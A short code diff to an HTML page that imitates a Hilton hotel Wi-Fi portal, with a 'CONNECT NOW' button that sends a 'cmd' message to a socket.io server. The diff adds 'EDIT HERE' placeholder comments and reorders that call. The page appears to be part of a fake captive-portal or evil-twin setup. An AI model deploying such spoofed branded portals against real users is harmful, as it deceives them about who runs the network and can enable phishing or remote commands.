@@ -62,6 +62,7 @@
       	width: 80vw;
       }
 	    
+      /* --- EDIT HERE --- */    
       #DOSOMETHING {
       	height: 100%;
       	width: 100%;
@@ -77,6 +78,7 @@
   <img id="hotel-logo" src="https://www.woodbinedevelopment.com/wp-content/uploads/2016/10/logo-hilton-1.png">
   <span id="button" onclick="wifi()">CONNECT NOW</span>
 	
+  <!-- --- EDIT HERE --- -->	  
   <div id="DOSOMETHING"></div>
   
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.4/socket.io.js"></script>
@@ -92,10 +94,11 @@
     		setTimeout(function() {
     			document.getElementById("loader").style.display = "none";
     			document.getElementById("hotel-logo").style.display = "none";
+    			socket.emit('msg', 'cmd');
 			
+			// --- EDIT HERE ---
     			document.getElementById("DOSOMETHING").style.display = "flex";
 			
-    			socket.emit('msg', 'cmd');
     		}, 1000);
     	}, 3000);
     }
